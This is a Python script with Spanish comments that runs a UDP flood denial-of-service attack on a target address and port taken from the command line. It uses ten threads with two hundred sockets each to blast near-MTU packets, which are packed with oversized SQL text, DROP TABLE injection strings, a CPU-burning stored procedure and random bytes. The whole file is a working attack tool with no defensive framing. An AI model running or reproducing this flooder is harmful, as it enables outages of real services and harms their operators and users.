import socket
import random
import sys
import time
import threading

def udp_sql_massive(target_ip, target_port, duration):
    """UDP SQL Flood con máximo ancho de banda"""
    
    # Crear muchos sockets para más throughput
    sockets = []
    for _ in range(200):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            sockets.append(sock)
        except:
            pass
    
    # SQL payloads ENORMES (casi MTU)
    mega_payloads = []
    
    # 1. SELECT masivo con columnas gigantes
    for _ in range(20):
        cols = [f"col_{i} AS c{i}" for i in range(500)]
        mega_payloads.append(
            (f"SELECT {', '.join(cols)} FROM massive_table_" + "x" * 1000 + " WHERE 1=1 AND " + 
             " AND ".join([f"field_{i} = {random.randint(1,999)}" for i in range(100)]) + 
             " ORDER BY id DESC LIMIT 10000;" + "/*" + "A" * 500 + "*/").encode()
        )
    
    # 2. INSERT con miles de valores
    for _ in range(20):
        values = [f"('user_{i}', RAND(), UUID(), '{random._urandom(200)}', NOW())" for i in range(100)]
        mega_payloads.append(
            (f"INSERT INTO logs_{random.randint(1,999)} (username, rand, uuid, data, created_at) VALUES " + 
             ", ".join(values) + ";").encode()
        )
    
    # 3. JSON/XML gigante
    for _ in range(20):
        json_obj = '{"' + '","'.join([f'key_{i}":"value_{i}' for i in range(1000)]) + '"}'
        mega_payloads.append(
            (f"INSERT INTO json_store (id, data) VALUES ({random.randint(1,9999)}, '{json_obj}');").encode() * 3
        )
    
    # 4. UNION queries masivas
    for _ in range(20):
        mega_payloads.append(
            (("SELECT * FROM table1 UNION ALL " * 200) + "SELECT * FROM table1;").encode()
        )
    
    # 5. WHERE clause con miles de condiciones
    for _ in range(20):
        conditions = " OR ".join([f"id = {random.randint(1,99999)}" for i in range(500)])
        mega_payloads.append(
            (f"SELECT * FROM users WHERE {conditions} AND " +
             f"username IN ('{random._urandom(500)}') AND " +
             f"created_at > NOW() - INTERVAL {random.randint(1,999)} DAY;").encode()
        )
    
    # 6. SQL injection patterns + datos binarios
    for _ in range(20):
        mega_payloads.append(
            (f"'; DROP TABLE users_{random.randint(1,999)}; -- " + "A" * 1400).encode()
        )
    
    # 7. Stored procedure gigante
    for _ in range(20):
        mega_payloads.append(
            (f"CREATE PROCEDURE kill_cpu_{random.randint(1,9999)}() BEGIN " + 
             "DECLARE i INT DEFAULT 0; " +
             "WHILE i < 1000000 DO " +
             "INSERT INTO perf_data VALUES (" + 
             f"{random.randint(1,999)}, RAND(), '{random._urandom(500)}', NOW()); " +
             "SET i = i + 1; END WHILE; END;").encode() * 2
        )
    
    # 8. CONNECT strings + queries
    for _ in range(20):
        mega_payloads.append(
            (f"CONNECT TO 'udp://{target_ip}:{target_port}' USER 'admin_{random.randint(1,999)}' " +
             f"PASSWORD '{random._urandom(300)}' DATABASE 'main_{random.randint(1,999)}' " +
             f"SCHEMA 'public_{random.randint(1,999)}' OPTIONS '{random._urandom(500)}'; " +
             f"sendQuery('SELECT * FROM {random._urandom(200).hex()}');").encode()
        )
    
    timeout = time.time() + duration
    packet_count = 0
    bytes_sent = 0
    
    while time.time() < timeout:
        try:
            # RÁFAGAS MASIVAS - usar todos los sockets
            for sock in sockets:
                for _ in range(random.randint(10, 50)):
                    payload = random.choice(mega_payloads)
                    # Asegurar tamaño máximo
                    if len(payload) < 1400:
                        payload += random._urandom(1400 - len(payload))
                    payload = payload[:1450]  # Cortar si excede MTU
                    
                    sock.sendto(payload, (target_ip, target_port))
                    packet_count += 1
                    bytes_sent += len(payload)
            
            # Estadísticas cada 100k paquetes
            if packet_count % 100000 == 0:
                mb_sent = bytes_sent / (1024 * 1024)
                print(f"\r[📡] Packets: {packet_count:,} | MB: {mb_sent:.1f} | Sockets: {len(sockets)}", end="")
            
        except Exception as e:
            # Recrear sockets si fallan
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
            
            sockets = []
            for _ in range(200):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                    sockets.append(sock)
                except:
                    pass
    
    for sock in sockets:
        try:
            sock.close()
        except:
            pass
    
    mb_total = bytes_sent / (1024 * 1024)
    print(f"\n\n[✅] Total: {packet_count:,} packets | {mb_total:.1f} MB")

def start_flood(target_ip, target_port, duration):
    threads = []
    for _ in range(10):  # 10 threads = máximo ancho de banda
        t = threading.Thread(target=udp_sql_massive, args=(target_ip, target_port, duration))
        t.daemon = True
        t.start()
        threads.append(t)
    
    time.sleep(duration)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    
    start_flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
